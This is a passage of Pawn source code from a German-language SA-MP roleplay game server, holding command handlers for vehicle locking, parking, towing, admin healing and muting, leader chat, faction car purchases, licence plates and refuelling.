        {
            new vid = GetPlayerVehicleID(playerid);
            if(IsADtCar(vid))
            {
				new carowner = GetDtCarOwner(vid);
				if (carowner == playerid)
				{
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
					if(doors == 1)
					{
						SetVehicleParamsEx(vid, engine, lights, alarm, 0, bonnet, boot, objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dein Fahrzeug aufgeschlossen.");
					}
					else
					{
						SetVehicleParamsEx(vid, engine, lights, alarm, 1, bonnet, boot, objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dein Fahrzeug abgeschlossen.");
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Du besitzt keinen Schlüssel für dieses Fahrzeug!");
				    return 1;
				}
			}
	        else for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
			{
			    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
				{
		            if(vid == FactionCars[fc][fCarid])
					{
				        if(PlayerInfo[playerid][sMember] == FactionCars[fc][fFaction])
						{
							new engine, lights, alarm, doors, bonnet, boot, objective;
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							if(doors == 1)
							{
								SetVehicleParamsEx(vid, engine, lights, alarm, 0, bonnet, boot, objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dein Fahrzeug aufgeschlossen.");
							}
							else
							{
								SetVehicleParamsEx(vid, engine, lights, alarm, 1, bonnet, boot, objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dein Fahrzeug abgeschlossen.");
							}
						}
						else
						{
						SendClientMessage(playerid, COLOR_GREY, "Du besitzt keinen Schlüssel für dieses Fahrzeug!");
						return 1;
						}
					}
				}
			}
	}
    return 1;
    }
	if (strcmp("/apark", cmd, true, 10) == 0)
    {
        if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        {
            if(PlayerInfo[playerid][pAdmin] >= 1338)
            {
                new trailercar = GetPlayerVehicleID(playerid);
                if(!IsADtCar(trailercar))
                {
                SendClientMessage(playerid, COLOR_GRAD2, "Das ist kein Privatfahrzeug!");
                return 1;
                }
                new Float:X,Float:Y,Float:Z;
                new Float:z_rot;
                GetVehiclePos(trailercar, X,Y,Z);
                GetVehicleZAngle(trailercar, z_rot);
                new carowner = GetDtCarOwner(trailercar);
                new slot = GetDtCarOwnerSlot(carowner,trailercar);
                PlayerCar[carowner][slot][CarPos_x] = X;
                PlayerCar[carowner][slot][CarPos_y] = Y;
                PlayerCar[carowner][slot][CarPos_z] = Z;
                PlayerCar[carowner][slot][CarRotate] = z_rot;
                OnPlayerCarUpdate(carowner,false);
                if(carowner != 555)
                {
                    OnPlayerCarUpdate(carowner,false);
                }
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Fahrzeug erfolgreich geparkt!");
                return 1;
            }
			else
			{
                SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
                return 1;
            }
	    }
    }














	if (strcmp("/abstellen", cmd, true, 10) == 0)
    {
        if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        {
                if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
                {
                    SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Wohnwagen an deinen Fahrzeug!");
                    return 1;
                }
                new trailercar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
                new Float:X,Float:Y,Float:Z;
                new Float:z_rot;
                GetVehiclePos(trailercar, X,Y,Z);
                GetVehicleZAngle(trailercar, z_rot);
                if(!IsADtCar(trailercar))
                {
                return 1;
                }
                new carowner = GetDtCarOwner(trailercar);
                new slot = GetDtCarOwnerSlot(carowner,trailercar);
                PlayerCar[carowner][slot][CarPos_x] = X;
                PlayerCar[carowner][slot][CarPos_y] = Y;
                PlayerCar[carowner][slot][CarPos_z] = Z;
                PlayerCar[carowner][slot][CarRotate] = z_rot;

                 DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
                 SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast deinen Wohnwagen hier geparkt!");
                 return 1;
        }
        else
        {
            SendClientMessage(playerid, COLOR_GREY, "Du bist in keinen Fahrzeug!");
            return 1;
        }
    }









	if (strcmp("/opark", cmd, true, 10) == 0)
    {
        if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(GetPlayerVehicleID(playerid)) == 525 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        {
            if(PlayerInfo[playerid][pMember] == 24||PlayerInfo[playerid][pLeader] == 24)
            {
/*
                if(!IsPlayerInRangeOfPoint(playerid, 70.0, 2268.6824,2045.2220,10.8203))
                {
                    SendClientMessage(playerid, COLOR_GREY, "Du bist nicht bei der Ordnungsamt Base!");
                    return 1;
                }
*/
                if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
                {
                    SendClientMessage(playerid, COLOR_GREY, "An deinem Abschleppwagen ist kein Auto angehängt!");
                    return 1;
                }
                new trailercar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
                new Float:X,Float:Y,Float:Z;
                new Float:z_rot;
                GetVehiclePos(trailercar, X,Y,Z);
                GetVehicleZAngle(trailercar, z_rot);
                if(!IsADtCar(trailercar))
                {
			        for(new fc;fc<sizeof(FactionCars);fc++)
					{
				        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
						{
				            if(trailercar == FactionCars[fc][fCarid])
							{
						        FactionCars[fc][fPos][0] = X;
								FactionCars[fc][fPos][1] = Y;
								FactionCars[fc][fPos][2] = Z;
								FactionCars[fc][fPos][3] = z_rot;
								FactionCars[fc][fTuning][17] = 1;
	           					DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
               					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Fraktionsfahrzeug erfolgreich abgeschleppt!");
								SendLeaderMessage(FactionCars[fc][fFaction], COLOR_LIGHTRED, "[Verwahrstelle] Eines ihrer Fraktionsfahrzeuge wurde abgeschleppt!");
								SendLeaderMessage(FactionCars[fc][fFaction], COLOR_LIGHTRED, "[Verwahrstelle] es befindet sich bei der Ordnungsamt Base!");
				  			}
					    }
				    }
                return 1;
                }
                new carowner = GetDtCarOwner(trailercar);
                new slot = GetDtCarOwnerSlot(carowner,trailercar);
				PlayerCar[carowner][slot][Abgeschleppt] = 1;
                PlayerCar[carowner][slot][CarPos_x] = X;
                PlayerCar[carowner][slot][CarPos_y] = Y;
                PlayerCar[carowner][slot][CarPos_z] = Z;
                PlayerCar[carowner][slot][CarRotate] = z_rot;
                 if(carowner != 555)
                 {
                     OnPlayerCarUpdate(carowner,false);
                     SendClientMessage(carowner, COLOR_LIGHTRED, "[Verwahrstelle] Ihr Fahrzeug wurde abgeschleppt!");
                     SendClientMessage(carowner, COLOR_LIGHTRED, "[Verwahrstelle] Nutze /findcar!");
                 }
                 DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
                 SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Fahrzeug erfolgreich abgeschleppt!");
                 return 1;
            }
			else
			{
                SendClientMessage(playerid, COLOR_GREY, "Du bist kein Mitglied des Ordnungsamtes!");
                return 1;
            }
        }
        else
        {
            SendClientMessage(playerid, COLOR_GREY, "Du musst einen Abschleppwagen fahren!");
            return 1;
        }
    }
	if(strcmp(cmd, "/createcar", true) == 0)
	{
		    if(PlayerInfo[playerid][pAdmin] != 2002)
		    {
				SendClientMessage(playerid, COLOR_GRAD2, "Du hast keine Berechtigung dafür!");
				return 1;
			}
	    if(IsPlayerConnected(playerid))
	    {

		    tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /createcar [playerid] [Model]");
				return 1;
			}
			new anzeigeid;
			giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			anzeigeid = strval(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			  		    if(Dtc_PlayerHaveCar[giveplayerid][Dtc_PlayerKey[giveplayerid]])
						{
						  SendClientMessage(playerid, COLOR_GREY, "Der Spieler hat bereits ein Fahrzeug auf seinen Slot!");
						  return 1;
						}
	                    if(anzeigeid >= 400 && anzeigeid <= 611)
						{
							dtc_AutohausCat[giveplayerid] = 0;
							SetTimerEx("ShowPlayerCar",3000,0,"i",giveplayerid);
				    		OnPlayerBuyCar(giveplayerid, anzeigeid, 0);
							dtc_AutohausCat[giveplayerid] = 2000;
					    	SendClientMessage(playerid, COLOR_LIGHTRED, "* Du hast das Fahrzeug erfolgreich erstellt!");
							return 1;
						}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht Online !");
			}
		}
	    return 1;
	}
	if (strcmp(cmd, "/areaall", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 2002)
			{
			    for(new all = 0; all < MAX_PLAYERS; all++)
			    {
			        if(PlayerInfo[all][pTotTime] > 1)
			        {
                  	 	  PlayerInfo[all][pTotTime] = 0;
		   				  SendClientMessage(all, COLOR_LIGHTBLUE, "* Du wurdest Administrativ geheilt!");
			        }
			    }
                format(string, sizeof(string), "AdmCmd: %s hat alle Spieler geheilt",GetName(playerid));
                ABroadCast(COLOR_LIGHTRED,string,1);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if (strcmp(cmd, "/area", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 2002)
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /area [Spieler ID]");
					return 1;
				}
	            giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
                	new giveplayeridname[MAX_PLAYER_NAME];
	                PlayerInfo[giveplayerid][pTot] = 0;
                    PlayerInfo[giveplayerid][pTotTime] = 0;
	                pIstTot[giveplayerid] = 0;
                    SetPlayerSpawn(giveplayerid);
                    SetCameraBehindPlayer(giveplayerid);
//  				    Delete3DTextLabel(DeathText[giveplayerid]);

					RemoveIcon(giveplayerid);



//					DestroyPickup(TotenKopf[giveplayerid]);
                    UnFreezePlayer(giveplayerid);
                    SetPlayerSkin(giveplayerid,PlayerInfo[giveplayerid][pChar]);
                    GetPlayerName(giveplayerid, giveplayeridname, sizeof(giveplayeridname));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    format(string, sizeof(string), "AdmCmd: %s hat %s geheilt!",sendername, giveplayeridname);
                    ABroadCast(COLOR_LIGHTRED,string,1);
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, " Der Spieler wurde nicht gefunden!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
			}
		}
		return 1;
	}
    if(strcmp(cmd, "/amute",true) == 0)
	{
	       if(PlayerInfo[playerid][pAdmin] >= 4)
	        {
        	tmp = strtoknew(cmdtext, idx);
        	if(!strlen(tmp))
        	{
            	SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /amute [playerid][Minuten][Grund]");
            	return 1;
        	}
        	giveplayerid = ReturnUser(tmp);

        	tmp = strtoknew(cmdtext, idx);
        	if(!tmp[0])return SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /amute [playerid][Minuten][Grund]");
			new Minutes = strval(tmp);
        	tmp = strtoknew(cmdtext, idx);
        	if(!tmp[0])return SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /amute [playerid][Minuten][Grund]");
			if(IsPlayerConnected(giveplayerid))
        	{
            	if(giveplayerid != INVALID_PLAYER_ID)
            	{
					if (PlayerInfo[playerid][pAdmin] >= 3)
					{
						if(IsPlayerConnected(giveplayerid))
						{
									PlayerInfo[giveplayerid][paMuted] = 1;
									PlayerInfo[giveplayerid][paMutedTime] = Minutes;
									GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									GetPlayerName(playerid, sendername, sizeof(sendername));
									format(string, sizeof(string), "AdmCmd: %s hat %s für %d Minuten aus dem Support System ausgeschlossen, Grund: %s.",sendername, giveplayer, Minutes,tmp);
		                            ABroadCast(COLOR_LIGHTRED,string,1);
									format(string, sizeof(string), "Admin %s hat dich für %d Minuten aus dem Support System ausgeschlossen, Grund: %s.", sendername, Minutes,tmp);
									SendClientMessage(giveplayerid, COLOR_RED, string);
								    if(Minutes == 0)
		         					{
									PlayerInfo[giveplayerid][paMuted] = 0;
									PlayerInfo[giveplayerid][paMutedTime] = 0;
									}
									return 1;
						}
					}
            	}
        	}
        	else
        	{
            	SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin !");
            	return 1;
        	}
    	}
    	return 1;
	}

/*
    if(strcmp(cmd, "/amute", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /amute [Spieler ID / Name] [Zeit in Minuten]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			new zeit;
			tmp = strtoknew(cmdtext, idx);
			zeit = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if(IsPlayerConnected(playa))
				{

							PlayerInfo[playa][paMuted] = 1;
							PlayerInfo[playa][paMutedTime] = zeit;
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "AdmCmd: %s hat %s für %d Minuten aus dem Support System ausgeschlossen.",sendername, giveplayer, zeit);
                            ABroadCast(COLOR_LIGHTRED,string,1);
							format(string, sizeof(string), "Admin %s hat dich für %d Minuten aus dem Support System ausgeschlossen.", sendername, zeit);
							SendClientMessage(playa, COLOR_LIGHTRED, string);

						    if(zeit == 0)
         					{
							PlayerInfo[playa][paMuted] = 0;
							PlayerInfo[playa][paMutedTime] = 0;
							}
							return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Admin!");
			}
		}
		return 1;
	}
*/
    if(strcmp(cmdtext, "/localmute",true) == 0)
	{
	       if(PlayerInfo[playerid][pAdmin] >= 4)
	        {
        	tmp = strtoknew(cmdtext, idx);
        	if(!strlen(tmp))
        	{
            	SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /mute [playerid][Minuten][Grund]");
            	return 1;
        	}
        	giveplayerid = ReturnUser(tmp);

        	tmp = strtoknew(cmdtext, idx);
        	if(!tmp[0])return SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /mute [playerid][Minuten][Grund]");
			new Minutes = strval(tmp);
        	tmp = strtoknew(cmdtext, idx);
        	if(!tmp[0])return SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /mute [playerid][Minuten][Grund]");
			if(IsPlayerConnected(giveplayerid))
        	{
            	if(giveplayerid != INVALID_PLAYER_ID)
            	{
					if (PlayerInfo[playerid][pAdmin] >= 3)
					{
						if(IsPlayerConnected(giveplayerid))
						{
									PlayerInfo[giveplayerid][pMuted] = 1;
									PlayerInfo[giveplayerid][pMutedTime] = Minutes;
									GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									GetPlayerName(playerid, sendername, sizeof(sendername));
									format(string, sizeof(string), "AdmCmd: %s hat %s für %d Minuten gemutet, Grund: %s.",sendername, giveplayer, Minutes,tmp);
		                            ABroadCast(COLOR_LIGHTRED,string,1);
									format(string, sizeof(string), "Admin %s hat dich für %d Minuten gemutet, Grund: %s.", sendername, Minutes,tmp);
									SendClientMessage(giveplayerid, COLOR_RED, string);
								    if(Minutes == 0)
		         					{
									PlayerInfo[giveplayerid][pMuted] = 0;
									PlayerInfo[giveplayerid][pMutedTime] = 0;
									}
									return 1;
						}
					}
            	}
        	}
        	else
        	{
            	SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin !");
            	return 1;
        	}
    	}
    	return 1;
	}
    if(strcmp(cmd, "/mute", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /mute [Spieler ID / Name] [Zeit in Minuten]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			new zeit;
			tmp = strtoknew(cmdtext, idx);
			zeit = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				if(IsPlayerConnected(playa))
				{
							PlayerInfo[playa][pMuted] = 1;
							PlayerInfo[playa][pMutedTime] = zeit;
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "AdmCmd: %s hat %s für %d Minuten gemutet.",sendername, giveplayer, zeit);
                            ABroadCast(COLOR_LIGHTRED,string,1);
							format(string, sizeof(string), "Admin %s hat dich für %d Minuten gemutet.", sendername, zeit);
							SendClientMessage(playa, COLOR_LIGHTRED, string);
						    if(zeit == 0)
         					{
							PlayerInfo[playa][pMuted] = 0;
							PlayerInfo[playa][pMutedTime] = 0;
							}
							return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Admin!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/ld", true) == 0 || strcmp(cmd, "/leaderchat", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Verwendung: (/ld)(Leader-Chat) [TEXT]");
				return 1;
			}
			if(PlayerInfo[playerid][pLeader] >=1)
			{
				if(PlayerInfo[playerid][pLeader] == 1) { format(string, sizeof(string), "** LSPD-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 2) { format(string, sizeof(string), "** FBI-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 3) { format(string, sizeof(string), "** Bundeswehr-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 4) { format(string, sizeof(string), "** Medic-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 5) { format(string, sizeof(string), "** LCN-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 6) { format(string, sizeof(string), "** Yakuza-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 7) { format(string, sizeof(string), "** Regierungs Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 8) { format(string, sizeof(string), "** Hitman Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 9) { format(string, sizeof(string), "** NR-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 10) { format(string, sizeof(string), "** Transport GmbH %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 11) { format(string, sizeof(string), "** Fahrschul-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 12) { format(string, sizeof(string), "** Triaden-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 13) { format(string, sizeof(string), "** Grove-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 14) { format(string, sizeof(string), "** Ballas-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 15) { format(string, sizeof(string), "** Ls Biker Club-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 16) { format(string, sizeof(string), "** Vagos-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 17) { format(string, sizeof(string), "** Aztecas-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 18) { format(string, sizeof(string), "** SF Rifa-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 19) { format(string, sizeof(string), "** RS-Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 20) { format(string, sizeof(string), "** Terror-Leader %s: %s  **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 21) { format(string, sizeof(string), "** Wheelmen Leader %s: %s **", sendername, result); }
				else if(PlayerInfo[playerid][pLeader] == 22) { format(string, sizeof(string), "** S.W.A.T %s: %s **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 23) { format(string, sizeof(string), "** Russen Mafia Leader %s: %s  **", sendername, result); }
                else if(PlayerInfo[playerid][pLeader] == 24) { format(string, sizeof(string), "** O-Amt-Leader %s: %s  **", sendername, result); }
				else
				{
					format(string, sizeof(string), "** Noob %s: %s, Ende. **", sendername, result);
				}
				SendLeaderMessage(1, 0xD7AD62FF, string);
				SendLeaderMessage(2, 0xD7AD62FF, string);
				SendLeaderMessage(3, 0xD7AD62FF, string);
				SendLeaderMessage(4, 0xD7AD62FF, string);
				SendLeaderMessage(5, 0xD7AD62FF, string);
				SendLeaderMessage(6, 0xD7AD62FF, string);
				SendLeaderMessage(7, 0xD7AD62FF, string);
				SendLeaderMessage(8, 0xD7AD62FF, string);
				SendLeaderMessage(9, 0xD7AD62FF, string);
				SendLeaderMessage(10, 0xD7AD62FF, string);
				SendLeaderMessage(11, 0xD7AD62FF, string);
				SendLeaderMessage(12, 0xD7AD62FF, string);
				SendLeaderMessage(13, 0xD7AD62FF, string);
				SendLeaderMessage(14, 0xD7AD62FF, string);
				SendLeaderMessage(15, 0xD7AD62FF, string);
				SendLeaderMessage(16, 0xD7AD62FF, string);
				SendLeaderMessage(17, 0xD7AD62FF, string);
				SendLeaderMessage(18, 0xD7AD62FF, string);
				SendLeaderMessage(19, 0xD7AD62FF, string);
				SendLeaderMessage(20, 0xD7AD62FF, string);
				SendLeaderMessage(21, 0xD7AD62FF, string);
				SendLeaderMessage(22, 0xD7AD62FF, string);
				SendLeaderMessage(23, 0xD7AD62FF, string);
				SendLeaderMessage(24, 0xD7AD62FF, string);
				printf("%s", string);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "   Du bist kein Leader!.");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/buycar", true) == 0)
	{
		if(IsPlayerInRangeOfPoint(playerid,3,1023.1495,-1091.6942,23.8349))
		{
			new mem = PlayerInfo[playerid][sMember];
			new ran = PlayerInfo[playerid][pRank];
			if(mem == 1 && ran == 12 ||
			   mem == 2 && ran == 12 ||
			   mem == 3 && ran == 12 ||
			   mem == 4 && ran == 12 ||
			   mem == 5 && ran == 12 ||
			   mem == 6 && ran == 12 ||
			   mem == 7 && ran == 12 ||
			   mem == 8 && ran == 12 ||
			   mem == 9 && ran == 12 ||
			   mem == 10 && ran == 12 ||
			   mem == 11 && ran == 12 ||
			   mem == 12 && ran == 12 ||
			   mem == 13 && ran == 12 ||
			   mem == 14 && ran == 12 ||
			   mem == 15 && ran == 12 ||
			   mem == 16 && ran == 12 ||
			   mem == 17 && ran == 12 ||
			   mem == 18 && ran == 12 ||
			   mem == 19 && ran == 12 ||
			   mem == 20 && ran == 12 ||
			   mem == 21 && ran == 12 ||
			   mem == 22 && ran == 12 ||
			   mem == 23 && ran == 12 ||
			   mem == 24 && ran == 12) {
				new sstring[512];
				strcat(sstring,"Burrito\t\t\t90.000$\n");
				strcat(sstring,"FCR-900\t\t\t120.000$\n");
				strcat(sstring,"Sultan\t\t\t350.000$\n");
				strcat(sstring,"Freeway\t\t\t67.000$\n");
				strcat(sstring,"Maverick\t\t\t270.000$\n");
				strcat(sstring,"PCJ-600\t\t\t270.000$\n");
				strcat(sstring,"Sanchez\t\t\t270.000$\n");
				strcat(sstring,"BF-400\t\t\t270.000$\n");
				ShowPlayerDialog(playerid,DIALOG_FRAKCAR,DIALOG_STYLE_LIST,"Fraktions Autohaus",sstring,"Auswählen","Abbruch");
				return 1;
			}
			else
			{
			return SCM(playerid,COLOR_GRAD2,"Du bist kein Leiter einer Fraktion");
			}
	     }
		 else
		 {
		 return SCM(playerid,COLOR_GRAD2,"Du befindest dich nicht beim Fraktions Autohaus!");
		 }
	}
	if(strcmp(cmd, "/resetalltuning", true) == 0)
	{
		if(PlayerInfo[playerid][pAdmin] >= 2001)
		{
			SCM(playerid,COLOR_LIGHTRED,"Tuning resettet!");
		    for(new i = 0; i < MAX_VEHICLES; i++)
			{
		        if(IsADtCar(i))
		        {
		                new carowner = GetDtCarOwner(i);
		                new slot = GetDtCarOwnerSlot(carowner,i);
		                PlayerCar[carowner][slot][CarVents] = 0;
		                PlayerCar[carowner][slot][CarLamps] = 0;
		                PlayerCar[carowner][slot][CarHood] = 0;
		                PlayerCar[carowner][slot][CarRoof] = 0;
		                PlayerCar[carowner][slot][CarSpoiler] = 0;
		                PlayerCar[carowner][slot][CarRB] = 0;
		                PlayerCar[carowner][slot][CarFB] = 0;
		                PlayerCar[carowner][slot][CarSideR] = 0;
		                PlayerCar[carowner][slot][CarSideL] = 0;
		                PlayerCar[carowner][slot][CarAusp] = 0;
		                PlayerCar[carowner][slot][CarWheel] = 0;
		                PlayerCar[carowner][slot][CarHyd] = 0;
		                PlayerCar[carowner][slot][CarNitro] = 0;
				}
		        else for(new fc;fc<sizeof(FactionCars);fc++)
				{
			        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
					{
			            if(i == FactionCars[fc][fCarid])
						{
                     	   FactionCars[fc][fTuning][0] = 0;
                     	   FactionCars[fc][fTuning][1] = 0;
                     	   FactionCars[fc][fTuning][2] = 0;
                     	   FactionCars[fc][fTuning][3] = 0;
                     	   FactionCars[fc][fTuning][4] = 0;
                     	   FactionCars[fc][fTuning][5] = 0;
                     	   FactionCars[fc][fTuning][6] = 0;
                     	   FactionCars[fc][fTuning][7] = 0;
                     	   FactionCars[fc][fTuning][8] = 0;
                     	   FactionCars[fc][fTuning][9] = 0;
                     	   FactionCars[fc][fTuning][10] = 0;
                     	   FactionCars[fc][fTuning][11] = 0;
                     	   FactionCars[fc][fTuning][12] = 0;
                     	   FactionCars[fc][fTuning][13] = 0;
                     	   FactionCars[fc][fTuning][14] = 0;
						}
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/contractall", true) == 0)
	{
		if(PlayerInfo[playerid][pAdmin] >= 2001)
		{
			SCM(playerid,COLOR_LIGHTRED,"Kopfgeld wurde auf jeden Spieler gesetzt (5000 Doller)");
		    for(new i = 0; i < MAX_PLAYERS; i++)
			{
				PlayerInfo[i][pHeadValue] += 5000;
			}
		}
		return 1;
	}
	if(strcmp("/kennzeichenkaufen", cmd, true) == 0)
	{
		if(KennzeichenErlaubnis[playerid] == 1)
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du hast bereits ein Kennzeichen gekauft!");
		    return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 25.0, 2324.6418,-1135.9731,1051.3047)&& GetPlayerVirtualWorld(playerid) == 2)
		{
		    if(GetPlayerMoneySave(playerid)<50000) return SCM(playerid,-1,"Du hast nicht genügend Geld!");
		    SendClientMessage(playerid, COLOR_YELLOW, "Du hast dir ein Kennzeichen für 50000$ gekauft, an Fahrzeug anbringen mit /kennzeichen");
		    KennzeichenErlaubnis[playerid] = 1;
		    GivePlayerMoneySave(playerid,-50000);
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht in der KFZ Zulassungstelle");
		}
		return 1;
	}
	if(strcmp(cmd, "/fillcar", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(IsPlayerInAnyVehicle(playerid))
	        {
			    if(PlayerInfo[playerid][pFuel] == 1)
			    {
			        new veh = GetPlayerVehicleID(playerid);
				    if(IsANoTachoVehicle(veh))
				    {
				        SendClientMessage(playerid,COLOR_YELLOW," Du kannst dieses Fahrzeug nicht betanken!");
						return 1;
				    }
					 	new fahrzeug = GetPlayerVehicleID(playerid);
					    if(IsADtCar(fahrzeug))
					    {
							 new carowner = GetDtCarOwner(fahrzeug);
							 new slot = GetDtCarOwnerSlot(carowner,fahrzeug);

						     if(PlayerCar[carowner][slot][Benzin]-15 < GetGasMax(GetVehicleModel(GetPlayerVehicleID(playerid))))
						     {
							     PlayerCar[carowner][slot][Benzin] += 15;
							 }
							 else
						     {

						        SendClientMessage(playerid,COLOR_GRAD2," Es befindet sich noch genug Treibstoff im Fahrzeug!");
							 }
					 	}
					    else for(new fc;fc<sizeof(FactionCars);fc++)
						{
						    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
							{
						        if(fahrzeug == FactionCars[fc][fCarid])
								{
				                     FactionCars[fc][fTuning][16] += 15;// Benzin
						  		}
							}
						}
				        PlayerInfo[playerid][pFuel] = 0;
						format(string, sizeof(string), "** %s Füllt sein Fahrzeug mit einen Kanister.", sendername);
						ProxDetectorEx(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
